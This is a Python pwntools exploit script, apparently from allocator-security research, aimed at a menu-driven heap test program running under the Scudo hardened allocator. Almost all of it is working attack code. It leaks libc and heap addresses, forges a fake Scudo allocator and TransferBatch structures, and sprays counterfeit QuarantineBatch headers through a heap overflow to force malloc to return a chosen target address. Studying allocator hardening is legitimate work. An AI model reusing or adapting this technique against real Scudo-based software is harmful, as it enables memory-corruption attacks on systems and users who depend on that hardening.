#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("../scudo-gdb-tooling/malloc-menu-linux")

gs = '''
continue
'''

env = {"LD_PRELOAD": "/home/siela1915/BA_Project/libscudo.so"}

if args.NOSCUDO:
    env = {}
elif args.QUARANTINE:
    env["SCUDO_OPTIONS"] = ":".join([
        "thread_local_quarantine_size_kb=5",
        "quarantine_size_kb=10",
        "quarantine_max_chunk_size=2048",
        "release_to_os_interval_ms=-1"
    ])

    
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, env=env)
    else:
        return process(elf.path, env=env, stdin=PTY)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1\n")
    io.sendafter(b"allocate: ", f"{size}\n".encode())
    chunk = io.recvline()
    index = chunk.split(b' ')[4]
    address = int(chunk.split(b' ')[7], 16)
    io.sendafter(b"quit\n", b"3\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())
    io.sendafter(b"write: ", f"{len(data)}\n".encode())
    io.sendafter(b"write: ", data)
    io.send(b"\n")
    return (index, address)

# Send the "free" option, send the address
def free(address):
    io.send(b"2\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())

def write(address, data):
    io.send(b"3\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())
    io.sendafter(b"write: ", f"{len(data)}\n".encode())
    io.sendafter(b"write: ", data)
    io.send(b"\n")

def get_libc_leak():
    io.send(b"6\n")
    io.recvuntil(b'@ ')
    leak = int(io.recvline(keepends=False), base=16) - elf.libc.sym.puts
    return leak

def populate_quarantine():
    for i in range(0x1000):
        free(malloc(0x20+i)[1])

def create_fake_allocator(heap_leak):
    '''
        struct scudo::AtomicOptions {
            scudo::atomic_u32 Val;
        }
    '''
    AtomicOptions_val = 0xffffffff

    '''
struct scudo::SizeClassAllocator32<scudo::DefaultConfig>::SizeClassInfo {
/* 0x0000      |  0x0004 */    class scudo::HybridMutex {
                                 private:
                                   static const scudo::u8 NumberOfTries;
                                   static const scudo::u8 NumberOfYields;
/* 0x0000      |  0x0004 */        struct scudo::atomic_u32 {
/* 0x0000      |  0x0004 */            volatile scudo::atomic_u32::Type ValDoNotUse;

                                       /* total size (bytes):    4 */
                                   } M;

                                   /* total size (bytes):    4 */
                               } Mutex;
/* 0x0004      |  0x000c */    struct scudo::SinglyLinkedList<scudo::SizeClassAllocatorLocalCache<scudo::SizeClassAllocator32<scudo::DefaultConfig> >::TransferBatch> : public scudo::IntrusiveList<scudo::SizeClassAllocatorLocalCache<scudo::SizeClassAllocator32<scudo::DefaultConfig> >::TransferBatch> {
/* XXX  8-byte padding   */

                                   /* total size (bytes):   12 */
                               } FreeList;
/* 0x0010      |  0x0004 */    scudo::uptr CurrentRegion;
/* 0x0014      |  0x0004 */    scudo::uptr CurrentRegionAllocated;
/* 0x0018      |  0x0008 */    struct scudo::SizeClassAllocator32<scudo::DefaultConfig>::SizeClassStats {
/* 0x0018      |  0x0004 */        scudo::uptr PoppedBlocks;
/* 0x001c      |  0x0004 */        scudo::uptr PushedBlocks;

                                   /* total size (bytes):    8 */
                               } Stats;
/* 0x0020      |  0x0004 */    scudo::u32 RandState;
/* 0x0024      |  0x0004 */    scudo::uptr AllocatedUser;
/* 0x0028      |  0x0004 */    scudo::uptr MinRegionIndex;
/* 0x002c      |  0x0004 */    scudo::uptr MaxRegionIndex;
/* 0x0030      |  0x0014 */    struct scudo::SizeClassAllocator32<scudo::DefaultConfig>::ReleaseToOsInfo {
/* 0x0030      |  0x0004 */        scudo::uptr PushedBlocksAtLastRelease;
/* 0x0034      |  0x0004 */        scudo::uptr RangesReleased;
/* 0x0038      |  0x0004 */        scudo::uptr LastReleasedBytes;
/* 0x003c      |  0x0008 */        scudo::u64 LastReleaseAtNs;

                                   /* total size (bytes):   20 */
                               } ReleaseInfo;
/* XXX 60-byte padding   */
    
    '''

    SizeClassInfo_structure = fit({
# enum State : u32 { Unlocked = 0, Locked = 1, Sleeping = 2 };
# class scudo::HybridMutex {
    # struct scudo::atomic_u32 {
        0x0: p32(0x0), # volatile scudo::atomic_u32::Type ValDoNotUse;
    # } M
# } Mutex

    # struct SinglyLinkedList<...TransferBatches> {
        0x4: p32(0xccddccdd),      # scudo::uptr Size;
        0x8: p32(heap_leak+0x10),  # T *First;
        0xc: p32(0xbbbbbbbb),      # T *Last;
    # } FreeList

        0x10: p32(0xdeadbeef),     # scudo::uptr CurrentRegion;
        0x14: p32(0x1000),         # scudo::uptr CurrentRegionAllocated;

    # struct scudo::SizeClassAllocator32<scudo::DefaultConfig>::SizeClassStats {
        0x18: p32(0x0),            # scudo::uptr PoppedBlocks;
        0x1c: p32(0x0),            # scudo::uptr PushedBlocks;
    # } Stats

        0x20: p32(0x0),            # scudo::u32 RandState;
        0x24: p32(0x0),            # scudo::uptr AllocatedUser;
        0x28: p32(0x0),            # scudo::uptr MinRegionIndex;
        0x2c: p32(0x0),            # scudo::uptr MaxRegionIndex;

    # struct scudo::SizeClassAllocator32<scudo::DefaultConfig>::ReleaseToOsInfo {
        0x30: p32(0x0),            # scudo::uptr PushedBlocksAtLastRelease;
        0x34: p32(0x0),            # scudo::uptr RangesReleased;
        0x38: p32(0x0),            # scudo::uptr LastReleasedBytes;
        0x3c: p64(0x0),            # scudo::u64 LastReleaseAtNs;
    # } ReleaseInfo

        0x44: b'A'*60 # /* XXX 60-byte padding   */
    })

    fake_allocator_structure = fit({
        0x0: p32(AtomicOptions_val),
        # /* XXX 60-byte hole      */
        0x40: SizeClassInfo_structure * 13,        
    })

    return fake_allocator_structure

def create_heap_spray(libc_leak, heap_leak, target):
    '''

        struct scudo::QuarantineBatch {
            scudo::QuarantineBatch *Next;
            scudo::uptr Size;
            scudo::u32 Count;
            void *Batch[1019];
        }

    '''

    fake_qb_header = 0xdeadbeef
    fake_qb_next   = 0xffffffff
    fake_qb_size   = 0xcafebabe

    start_of_qb_spray = heap_leak + 0xff8

    distance_from_libc_allocator = 0x37e2e0
    allocator_ptr = libc_leak - distance_from_libc_allocator
    info(f'&TSD.Cache.Allocator @ 0x{allocator_ptr:02x}')

    info(f'start of qb spray @ 0x{start_of_qb_spray:02x}')

    fake_qb_batch_spray_addr = start_of_qb_spray + 0x8 + 0xc

    heap_spray = b''

    # Remember this
    # mov dword ptr [eax + ecx*4 + 0xc], edx
    # where eax + 0xc = &Batch[] and ecx = Count
    # we want ecx*4 = the difference between &Batch[] and &TSD.Cache.Allocator
    # Although we have both heap and libc leak, the offset from the overflow chunk to the QuarantineBatch is a little bit random.
    # Fortunately we can deduce it safely with heap spray.

    for i in range(4):
        fake_qb_count  = (allocator_ptr - fake_qb_batch_spray_addr) // 4

        SprayQuarantineBatch = p64(fake_qb_header) + fit({
            0x0: p32(fake_qb_next),
            0x4: p32(fake_qb_size),
            0x8: p32(fake_qb_count),
            0x0ff4: p32(0xeeeeeeee)
        })

        heap_spray += SprayQuarantineBatch
        fake_qb_batch_spray_addr += 0x1000

    '''
        struct TransferBatch {
            TransferBatch *Next;
            u32 Count;
            CompactPtrT Batch[MaxNumCached];
        };
    '''

    fakeTransferBatch = fit({
        0x0: p32(0xcafecafe), # TransferBatch *Next;
        0x4: p32(0x1),        # u32 Count;
        0x8: p32(target-0x8), # CompactPtrT Batch[0];
    })

    padding = b'A'*0x10 + fakeTransferBatch + b'A'*(0xff8 - len(fakeTransferBatch) - 0x10)

    overflow = padding + heap_spray

    return overflow

io = start()


# =============================================================================

# =-=-=- EXAMPLE -=-=-=
libc_leak = get_libc_leak()

_, target = malloc(100)

tmpInd, tmpAdd = malloc(24)
fakeInd, fakeAdd = malloc(0x800 - 0x10)

free(tmpAdd)

overflowInd, overflowAdd = malloc(0x1000 - 0x40)

write(fakeAdd, create_fake_allocator(overflowAdd))

write(overflowAdd, create_heap_spray(libc_leak, overflowAdd, target))

free(fakeAdd)

smallInd, smallAdd = malloc(64)

info(f"target: {target}")
info(f"result: {smallAdd}")

# =============================================================================

io.interactive()
